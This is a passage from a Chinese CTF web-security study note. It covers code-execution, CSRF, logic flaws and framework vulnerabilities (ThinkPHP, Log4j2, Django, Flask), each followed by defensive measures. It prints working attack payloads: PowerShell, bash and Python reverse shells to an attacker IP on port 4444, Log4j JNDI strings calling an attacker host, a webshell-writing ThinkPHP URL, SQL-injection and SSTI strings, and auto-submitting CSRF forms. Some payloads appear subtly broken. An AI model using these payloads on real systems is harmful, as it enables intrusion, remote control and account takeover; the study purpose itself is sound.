class="string">&quot;<span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;攻击者IP&#x27;,4444);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendback3</span> = [text.encoding]::ASCII.GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendback3</span>,0,<span class="variable">$sendback3</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="（2）代码执行漏洞"><a href="#（2）代码执行漏洞" class="headerlink" title="（2）代码执行漏洞"></a>（2）代码执行漏洞</h3><ol><li>漏洞本质与触发场景</li></ol><ul><li><p>本质：用户输入未经过滤，被当作代码片段直接嵌入程序执行（区别于命令执行：代码执行是运行应用层语言代码，命令执行是运行系统终端命令）。</p></li><li><p>常见触发场景：模板引擎渲染（如 ThinkPHP 模板、Jinja2）、动态代码调用（如 PHP <code>eval()</code>、Python <code>exec()</code>）、配置文件动态解析、插件&#x2F;模块加载。</p></li><li><p>典型触发函数（按语言划分）：</p></li><li><p>PHP：<code>eval()</code>、<code>assert()</code>、<code>preg_replace(&quot;/a/e&quot;, &quot;代码&quot;, $input)</code>、<code>create_function()</code></p></li><li><p>Python：<code>exec()</code>、<code>eval()</code>、<code>compile()</code></p></li><li><p>Java：<code>ScriptEngine.eval()</code>（JavaScript 引擎）、<code>Class.forName()</code>（反射调用）</p></li><li><p>Node.js：<code>eval()</code>、<code>new Function()</code></p></li></ul><ol start="2"><li>CTF 高频利用场景</li></ol><ul><li><p>PHP 代码执行示例：</p></li><li><p>输入点：<code>?code=phpinfo();</code>（若后端执行 <code>eval($_GET[&#39;code&#39;]);</code>）</p></li><li><p>读取文件：<code>?code=system(&#39;cat /flag&#39;);</code> 或 <code>?code=file_get_contents(&#39;/flag&#39;);</code></p></li><li><p>反弹 Shell：<code>?code=exec(&#39;bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1&#39;);</code></p></li><li><p>Python 代码执行示例：</p></li><li><p>输入点：<code>?code=__import__(&#39;os&#39;).system(&#39;ls&#39;)</code>（若后端执行 <code>exec(request.args.get(&#39;code&#39;))</code>）</p></li><li><p>读取文件：<code>?code=open(&#39;/flag&#39;,&#39;r&#39;).read()</code></p></li><li><p>模板引擎注入（如 Jinja2&#x2F;Django 模板）：</p></li><li><p>输入点：<code>&#123;&#123;config&#125;&#125;</code>（读取配置）、<code>&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;</code>（遍历子类找执行函数）</p></li></ul><ol start="3"><li>过滤绕过核心方法</li></ol><ul><li><p>关键字过滤绕过（如过滤 <code>eval</code>、<code>system</code>）：</p></li><li><p>字符串拼接：<code>e.&#39;val&#39;()</code> → <code>eval()</code>（PHP）、<code>__import__(&#39;o&#39;+&#39;s&#39;).system(&#39;ls&#39;)</code>（Python）</p></li><li><p>编码绕过：<code>base64_decode(&#39;ZXZhbCgocGhwZW5mb3MoKTs=&#39;)</code>（PHP，解码后为 <code>eval(phpinfo());</code>）</p></li><li><p>函数别名：<code>$f = &#39;system&#39;;$f(&#39;ls&#39;);</code>（PHP）、<code>os.system = func;func(&#39;ls&#39;)</code>（Python）</p></li><li><p>语法限制绕过（如禁止括号、引号）：</p></li><li><p>无括号执行（PHP）：<code>phpinfo;</code>（部分版本支持函数名省略括号）</p></li><li><p>无引号绕过：<code>echo chr(108).chr(115);</code>（chr 函数构造字符串，避免引号）</p></li></ul><ol start="4"><li>防御措施</li></ol><ul><li><p>禁止动态执行：避免使用 <code>eval()</code>、<code>exec()</code> 等危险函数，优先使用安全的替代方案。</p></li><li><p>严格输入过滤：对用户输入进行白名单校验，禁止包含代码关键字（如 <code>eval</code>、<code>system</code>、<code>;</code>、<code>()</code>）。</p></li><li><p>代码隔离：使用沙箱环境运行不可信代码（如 Python <code>restrictedpython</code>、Java 安全管理器）。</p></li><li><p>权限控制：应用程序运行账户遵循最小权限原则，禁止使用 root&#x2F;administrator 权限。</p></li></ul><h2 id="1-2-2-5-CSRF-跨站请求伪造（权限劫持漏洞）"><a href="#1-2-2-5-CSRF-跨站请求伪造（权限劫持漏洞）" class="headerlink" title="1.2.2.5 CSRF 跨站请求伪造（权限劫持漏洞）"></a>1.2.2.5 CSRF 跨站请求伪造（权限劫持漏洞）</h2><h3 id="关键掌握点："><a href="#关键掌握点：" class="headerlink" title="关键掌握点："></a>关键掌握点：</h3><ol><li>漏洞本质与触发条件</li></ol><ul><li><p>本质：攻击者利用用户已登录的身份（Cookie 未过期），诱导用户点击恶意链接或访问恶意页面，发起未授权的请求（如修改密码、转账、添加管理员），服务器误认为是用户本人操作。</p></li><li><p>触发三要素：</p></li><li><p>用户已登录目标网站（持有有效身份凭证 Cookie）；</p></li><li><p>攻击者构造了恶意请求（与目标操作的请求参数、方法一致）；</p></li><li><p>用户主动触发恶意请求（点击链接、访问页面、加载图片）。</p></li><li><p>常见攻击场景：修改用户信息（密码、手机号、邮箱）、资金操作（转账、支付）、权限操作（添加管理员、授权）、数据提交（发布文章、评论）。</p></li></ul><ol start="2"><li>核心利用流程（CTF 实战）</li></ol><ul><li>步骤 1：分析目标操作的请求（用 Burp Suite 抓包），例如修改密码的请求：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/change_password</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="params">Host:</span> target.com</span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="params">Cookie:</span> session<span class="operator">=</span>abc123xyz（用户已登录的会话 Cookie）</span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> application<span class="symbol">/x-www-form-urlencoded</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="attr">old_pwd</span><span class="operator">=</span><span class="number">123456</span>&amp;new_pwd<span class="operator">=</span>hack123&amp;confirm_pwd<span class="operator">=</span>hack123</span></span><br><span class="line"><span class="language-nix"></span></span><br></pre></td></tr></table></figure><ul><li>步骤 2：构造恶意请求页面（HTML 表单自动提交，无需用户操作）：</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 恶意页面 csrf.html --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.forms[0].submit()&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://target.com/change_password&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;old_pwd&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>&gt;</span> <span class="comment">&lt;!-- 假设攻击者已知旧密码，或目标无旧密码验证 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;new_pwd&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hack123&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;confirm_pwd&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hack123&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>步骤 3：诱导用户访问 <code>csrf.html</code>（如通过邮件、聊天工具发送链接），用户点击后自动提交请求，密码被修改。</li></ul><ol start="3"><li>过滤绕过核心技巧（CTF 高频）</li></ol><ul><li><p>Referer 过滤绕过：</p></li><li><p>空 Referer：通过 <code>iframe</code> 或 <code>img</code> 标签发起请求（部分浏览器会省略 Referer）；</p></li><li><p>伪造 Referer：使用 PHP 跳转页面伪造 Referer（如 <code>header(&quot;Referer: http://target.com&quot;)</code>）；</p></li><li><p>Referer 模糊匹配：若服务器只校验 Referer 包含 <code>target.com</code>，可构造 <code>http://target.com.attacker.com</code>。</p></li><li><p>Token 过滤绕过（若服务器未正确校验 Token）：</p></li><li><p>Token 泄露：从页面源码、Cookie、其他请求中提取 Token（如 Token 存储在前端本地存储）；</p></li><li><p>Token 复用：同一用户的 Token 未过期时，直接复用之前抓取的 Token；</p></li><li><p>无 Token 校验：部分接口看似需要 Token，但后端未实际校验，直接删除 Token 参数即可绕过。</p></li><li><p>请求方法绕过：</p></li><li><p>若服务器只限制 POST 请求的 CSRF，可尝试将请求改为 GET 方法（如 <code>http://target.com/change_password?old_pwd=123456&amp;new_pwd=hack123</code>）。</p></li></ul><ol start="4"><li>CTF 高频考点与 Payload</li></ol><ul><li><p>自动提交表单（最常用）：如上述修改密码的 HTML 表单，核心是“参数与目标请求一致”。</p></li><li><p>图片标签触发 GET 请求：</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://target.com/transfer?to=attacker&amp;amount=10000&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>跨域请求伪造（结合 CORS 配置不当）：若目标网站允许跨域请求，可通过 AJAX 发起 POST 请求。</p></li><li><p>防御措施：</p></li><li><p>添加 CSRF Token：每次请求随机生成 Token，存储在 session 中，前端提交时携带，后端校验；</p></li><li><p>校验 Referer&#x2F;Origin：限制请求来源为可信域名；</p></li><li><p>二次验证：敏感操作（如转账、改密码）需输入验证码或密码；</p></li><li><p>SameSite Cookie：设置 Cookie 的 <code>SameSite=Strict/Lax</code>，禁止第三方网站携带 Cookie 发起请求。</p></li></ul><h1 id="1-2-2-6-逻辑漏洞（业务层高频漏洞）"><a href="#1-2-2-6-逻辑漏洞（业务层高频漏洞）" class="headerlink" title="1.2.2.6 逻辑漏洞（业务层高频漏洞）"></a>1.2.2.6 逻辑漏洞（业务层高频漏洞）</h1><ol><li>漏洞本质与核心特点</li></ol><p>*本质：应用程序的业务逻辑设计缺陷，导致攻击者可绕过正常业务流程，获取未授权访问、敏感数据或非法利益（区别于技术漏洞，逻辑漏洞不依赖代码语法错误，而是业务规则设计不当）。</p><ul><li>核心特点：无明显报错、依赖业务场景、工具难以扫描检测，需手动分析业务流程。</li></ul><ol start="2"><li>高频漏洞类型与实战利用</li></ol><h3 id="（1）越权访问漏洞"><a href="#（1）越权访问漏洞" class="headerlink" title="（1）越权访问漏洞"></a>（1）越权访问漏洞</h3><ul><li><p>原理：服务器未严格校验用户的权限，导致低权限用户可访问&#x2F;操作高权限用户的数据或功能。</p></li><li><p>分类与场景：</p></li><li><p>水平越权：同权限用户之间的数据访问（如用户 A 可查看用户 B 的订单、个人信息）；</p></li><li><p>垂直越权：低权限用户访问高权限功能（如普通用户可访问管理员后台、执行管理员操作）。</p></li><li><p>CTF 利用技巧：</p></li><li><p>水平越权：</p></li><li><p>替换用户 ID：<code>/user/info?id=1001</code> → 改为 <code>id=1002</code>（遍历 ID 查看其他用户数据）；</p></li><li><p>Cookie 伪造：修改 Cookie 中的 <code>user_id</code>、<code>role</code> 字段（如 <code>role=user</code> → <code>role=admin</code>）；</p></li><li><p>接口参数泄露：从响应包中提取其他用户的 ID&#x2F;订单号，直接访问。</p></li><li><p>垂直越权：</p></li><li><p>直接访问管理员路径：<code>/admin/login</code> → 若未校验权限，普通用户可直接登录；</p></li><li><p>功能点未授权：<code>/admin/delete_user?id=100</code>，普通用户直接调用该接口删除用户；</p></li><li><p>权限标识篡改：<code>/api/operate?action=view</code> → 改为 <code>action=delete</code>（高权限操作）。</p></li><li><p>示例（CTF 真题）：</p></li><li><p>某 CTF 平台的“个人中心”接口 <code>GET /api/profile?uid=5</code>，返回当前用户信息。将 <code>uid=5</code> 改为 <code>uid=1</code>（管理员 ID），直接获取管理员的 flag。</p></li></ul><h3 id="（2）验证码绕过漏洞"><a href="#（2）验证码绕过漏洞" class="headerlink" title="（2）验证码绕过漏洞"></a>（2）验证码绕过漏洞</h3><ul><li><p>原理：验证码的生成、校验、有效期设计不当，导致攻击者可绕过验证码验证。</p></li><li><p>高频绕过方法：</p></li><li><p>验证码永久有效：同一验证码可多次使用（如登录接口，验证码生成后未失效，攻击者抓包后重复提交）；</p></li><li><p>验证码为空绕过：后端未校验验证码是否为空，直接删除 <code>code</code> 参数即可提交；</p></li><li><p>验证码长度&#x2F;格式校验不严：如验证码为 4 位数字，后端只校验长度，可暴力枚举 0000-9999；</p></li><li><p>验证码泄露：验证码通过 URL 参数传递（<code>?code=1234</code>），可从日志、Referer 中获取；</p></li><li><p>短信验证码轰炸：未限制同一手机号的发送频率，攻击者批量发送验证码，暴力破解。</p></li><li><p>CTF 示例：</p></li><li><p>某登录接口 <code>POST /login</code>，参数为 <code>username=test&amp;password=123&amp;code=4567</code>。抓包后删除 <code>code</code> 参数，直接提交，登录成功（后端未校验验证码必填）。</p></li></ul><h3 id="（3）支付逻辑漏洞"><a href="#（3）支付逻辑漏洞" class="headerlink" title="（3）支付逻辑漏洞"></a>（3）支付逻辑漏洞</h3><ul><li><p>原理：支付流程中的金额、订单状态、支付结果校验不当，导致攻击者可低价购买商品、重复支付、免费获取商品。</p></li><li><p>CTF 利用技巧：</p></li><li><p>金额篡改：</p></li><li><p>前端修改金额：购物车结算时，通过 Burp 拦截请求，将 <code>amount=100</code> 改为 <code>amount=0.01</code>；</p></li><li><p>折扣&#x2F;优惠券滥用：重复使用优惠券、修改优惠券金额（<code>coupon_id=10</code> → 改为 <code>coupon_id=99</code>，高折扣优惠券）；</p></li><li><p>订单状态篡改：</p></li><li><p>支付后未校验订单状态：<code>/order/confirm?id=5</code>，直接修改订单状态为“已支付”（<code>status=paid</code>）；</p></li><li><p>重复支付漏洞：支付成功后，再次提交支付请求，获取多份商品或退款。</p></li><li><p>示例（CTF 真题）：</p></li><li><p>某商城支付接口 <code>POST /pay</code>，参数 <code>order_id=123&amp;amount=99</code>。拦截后将 <code>amount=0.01</code>，提交支付，支付 0.01 元即可获取商品，后台未校验金额与订单实际金额是否一致。</p></li></ul><h3 id="（4）会话管理缺陷"><a href="#（4）会话管理缺陷" class="headerlink" title="（4）会话管理缺陷"></a>（4）会话管理缺陷</h3><ul><li><p>原理：用户登录、退出、会话过期等流程设计不当，导致会话被劫持或复用。</p></li><li><p>高频场景：</p></li><li><p>登录态永久有效：Cookie 无过期时间，用户退出后 Cookie 未删除，攻击者可复用 Cookie 登录；</p></li><li><p>会话 ID 固定：用户登录前后会话 ID 不变，攻击者可提前获取会话 ID，诱导用户登录后复用；</p></li><li><p>退出功能失效：点击“退出登录”后，仅前端跳转，未销毁后端 session，Cookie 仍有效。</p></li><li><p>CTF 利用技巧：</p></li><li><p>登录前获取会话 ID（如 Cookie <code>PHPSESSID=abc123</code>），诱导用户登录后，使用该 session ID 直接访问用户页面；</p></li><li><p>退出登录后，刷新页面或重新访问 <code>/user/info</code>，发现仍处于登录状态，直接获取数据。</p></li></ul><h3 id="（5）其他逻辑漏洞"><a href="#（5）其他逻辑漏洞" class="headerlink" title="（5）其他逻辑漏洞"></a>（5）其他逻辑漏洞</h3><ul><li><p>注册功能漏洞：</p></li><li><p>用户名重复注册：可注册管理员用户名（如 <code>admin</code>），覆盖原管理员账户；</p></li><li><p>邮箱&#x2F;手机号未验证：可注册他人手机号，接收验证码重置密码。</p></li><li><p>密码重置漏洞：</p></li><li><p>重置链接永久有效：攻击者获取重置密码链接后，可随时重置用户密码；</p></li><li><p>重置参数篡改：<code>/reset_password?token=xxx&amp;user=1001</code> → 改为 <code>user=1002</code>，重置其他用户密码。</p></li></ul><ol start="3"><li>防御措施</li></ol><ul><li><p>权限校验：所有敏感操作（访问数据、执行功能）前，严格校验用户角色和权限，从后端而非前端控制；</p></li><li><p>参数校验：核心参数（金额、用户 ID、订单号）需后端二次校验，避免信任前端传入的值；</p></li><li><p>会话管理：登录后更新会话 ID、设置合理的过期时间、退出时销毁 session 和 Cookie；</p></li><li><p>验证码设计：验证码有效期短（1-5 分钟）、随机生成、后端校验、限制发送频率；</p></li><li><p>业务流程审计：梳理关键业务流程（注册、登录、支付、密码重置），排查逻辑断点和绕过可能。</p></li></ul><h2 id="1-2-2-7-框架漏洞（Web-框架高频-RCE-注入漏洞）"><a href="#1-2-2-7-框架漏洞（Web-框架高频-RCE-注入漏洞）" class="headerlink" title="1.2.2.7 框架漏洞（Web 框架高频 RCE&#x2F;注入漏洞）"></a>1.2.2.7 框架漏洞（Web 框架高频 RCE&#x2F;注入漏洞）</h2><p>*框架漏洞是指 Web 开发框架（如 ThinkPHP、Spring）自身的设计缺陷或代码漏洞，攻击者可利用框架的核心功能（路由、参数解析、模板渲染）发起攻击，无需关注业务代码，通用性强。</p><h3 id="（1）ThinkPHP-框架漏洞（PHP-主流框架）"><a href="#（1）ThinkPHP-框架漏洞（PHP-主流框架）" class="headerlink" title="（1）ThinkPHP 框架漏洞（PHP 主流框架）"></a>（1）ThinkPHP 框架漏洞（PHP 主流框架）</h3><ul><li><p>高频漏洞类型：远程代码执行（RCE）、SQL 注入、文件包含。</p></li><li><p>典型漏洞与 CTF Payload：</p></li><li><p>ThinkPHP 5.0&#x2F;5.1 RCE 漏洞（CVE-2018-20062）：</p></li><li><p>漏洞原因：路由参数未过滤，直接拼接执行代码；</p></li><li><p>触发条件：框架版本 5.0.0-5.0.23、5.1.0-5.1.30，未开启路由强制路由模式；</p></li><li><p>Payload（GET 请求）：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://target.com/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">http://target.com/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20eval($_POST[cmd]);?%3E</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>ThinkPHP 3.2 SQL 注入漏洞：</p></li><li><p>漏洞原因：参数绑定未过滤，直接拼接 SQL 语句；</p></li><li><p>Payload：<code>/index.php?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT flag FROM flag LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</code>。</p></li><li><p>防御措施：</p></li><li><p>升级框架至最新版本；</p></li><li><p>开启强制路由模式，禁用默认路由；</p></li><li><p>过滤敏感参数，禁止传入 <code>\think\</code> 等框架核心类名。</p></li></ul><h3 id="（2）Spring-框架漏洞（Java-主流框架）"><a href="#（2）Spring-框架漏洞（Java-主流框架）" class="headerlink" title="（2）Spring 框架漏洞（Java 主流框架）"></a>（2）Spring 框架漏洞（Java 主流框架）</h3><ul><li><p>高频漏洞类型：远程代码执行（Log4j2 漏洞）、目录遍历、SQL 注入、Spring Boot Actuator 未授权访问。</p></li><li><p>典型漏洞与 CTF Payload：</p></li><li><p>Log4j2 远程代码执行（CVE-2021-44228，“Log4j 核弹”）：</p></li><li><p>漏洞原因：Log4j2 支持 JNDI 注入，攻击者可通过构造恶意日志内容，触发远程代码执行；</p></li><li><p>触发场景：任何使用 Log4j2 记录用户输入的地方（如登录用户名、请求参数、HTTP 头部）；</p></li><li><p>Payload（HTTP 头部示例）：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">User-Agent: $&#123;jndi:ldap://攻击者IP:1389/恶意类&#125;</span><br><span class="line"></span><br><span class="line">Referer: $&#123;jndi:rmi://攻击者IP:1099/恶意类&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>利用工具：<code>JNDI-Injection-Exploit</code>（生成恶意 LDAP&#x2F;RMI 服务）、<code>log4j-scan</code>（漏洞扫描）。</p></li><li><p>Spring Boot Actuator 未授权访问：</p></li><li><p>漏洞原因：Actuator 是 Spring Boot 监控工具，若未配置权限，攻击者可访问 <code>/actuator/health</code>、<code>/actuator/env</code> 等接口，获取系统信息、配置文件；</p></li><li><p>利用：访问 <code>/actuator/env</code> 查看数据库密码、密钥；访问 <code>/actuator/heapdump</code> 下载内存快照，提取敏感信息。</p></li><li><p>防御措施：</p></li><li><p>升级 Log4j2 至 2.17.0 以上版本；</p></li><li><p>禁用 Log4j2 的 JNDI 功能（<code>log4j2.formatMsgNoLookups=true</code>）；</p></li><li><p>Actuator 配置访问权限（如添加 Spring Security 认证）、限制访问 IP、禁用敏感接口。</p></li></ul><h3 id="（3）Django-框架漏洞（Python-主流框架）"><a href="#（3）Django-框架漏洞（Python-主流框架）" class="headerlink" title="（3）Django 框架漏洞（Python 主流框架）"></a>（3）Django 框架漏洞（Python 主流框架）</h3><ul><li><p>高频漏洞类型：SQL 注入、模板注入（SSTI）、CSRF 防护绕过、文件上传漏洞。</p></li><li><p>典型漏洞与 CTF Payload：</p></li><li><p>Django 模板注入（SSTI）：</p></li><li><p>漏洞原因：模板渲染时用户输入未过滤，直接嵌入模板（如 <code>render(request, &#39;index.html&#39;, &#123;&#39;name&#39;: user_input&#125;)</code>，若 <code>user_input</code> 包含模板语法）；</p></li><li><p>Payload：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&#123;7*7&#125;&#125; → 执行计算（验证漏洞存在）</span><br><span class="line"></span><br><span class="line">&#123;&#123;config&#125;&#125; → 查看 Django 配置（含 SECRET_KEY）</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125; → 遍历所有子类，寻找可执行代码的类</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&#125;&#125; → 执行系统命令</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>Django SQL 注入（CVE-2021-35042）：</p></li><li><p>漏洞原因：<code>QuerySet.annotate()</code> 函数未过滤参数，导致 SQL 注入；</p></li><li><p>Payload：<code>?order=CASE+WHEN+(SELECT+1+FROM+flag+WHERE+flag+LIKE+&#39;flag&#123;%')+THEN+id+ELSE+name+END`。- 防御措施：- 升级 Django 至最新版本；- 模板渲染时使用 `&#123;&#123; name|escape &#125;&#125;` 过滤用户输入；- 避免直接使用 `raw()` 函数执行 SQL，使用 ORM 框架的参数化查询；- 开启 Django 自带的 CSRF 防护（`csrf_token`）。### （4）Flask 框架漏洞（Python 轻量框架）- 高频漏洞类型：模板注入（SSTI）、文件上传、会话劫持。- 典型漏洞与 CTF Payload：- Flask SSTI（最高频漏洞）：- 漏洞原因：使用 `render_template_string` 渲染用户输入，未过滤模板语法（如 `@app.route('/') def index(): name = request.args.get('name'); return render_template_string(name)`）；- Payload（进阶利用）：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 执行命令</span><br><span class="line"></span><br><span class="line">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"># 读取文件</span><br><span class="line"></span><br><span class="line">&#123;&#123;request.application.__globals__.__builtins__.open(&#x27;/flag&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"># 反弹 Shell</span><br><span class="line"></span><br><span class="line">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;socket&#x27;).socket(socket.AF_INET,socket.SOCK_STREAM).connect((&#x27;攻击者IP&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;])&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>- 文件上传漏洞：- 漏洞原因：Flask 上传文件时未校验文件类型/后缀，直接保存到服务器 Web 目录；- 利用：上传 `shell.php` 文件，若后端未过滤，直接访问 `http://target.com/uploads/shell.php` 执行代码。- 防御措施：- 避免使用 `render_template_string` 渲染用户输入，若必须使用，需过滤模板语法（如 `&#123;&#123;`、`&#125;&#125;`、`&#123;%`、`%&#125;</code>）；</p></li><li><p>文件上传时校验文件后缀（白名单）、文件内容（如校验图片的 Magic Number）；</p></li><li><p>设置 Flask 的 <code>SECRET_KEY</code> 为强随机值，防止会话伪造。</p></li></ul><ol start="4"><li>框架漏洞核心解题思路（CTF 实战）</li></ol><ul><li><p>第一步：识别框架版本（通过响应头、页面报错、 robots.txt、特定路径）：</p></li><li><p>ThinkPHP：响应头 <code>X-Powered-By: ThinkPHP/5.0.20</code>；</p></li><li><p>Spring：页面报错含 <code>org.springframework.web.bind.MissingServletRequestParameterException</code>；</p></li><li><p>Django：<code>/admin</code> 页面默认样式、响应头 <code>X-Frame-Options: DENY</code>；</p></li><li><p>Flask：页面报错含 <code>werkzeug.exceptions.NotFound</code>（Werkzeug 是 Flask 依赖）。</p></li><li><p>第二步：根据框架版本，搜索对应漏洞（参考 Exploit-DB、CNVD、NVD）；</p></li><li><p>第三步：验证漏洞并利用（优先使用公开 Payload，结合 CTF 目标（如读取 flag、反弹 Shell）调整参数）；</p></li><li><p>第四步：若漏洞需特定条件（如开启某功能、特定配置），尝试绕过配置限制（如修改请求参数、伪造请求头）。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web前置知识</title>
      <link href="/2025/12/02/web/web%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/"/>
      <url>/2025/12/02/web/web%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/</url>
      
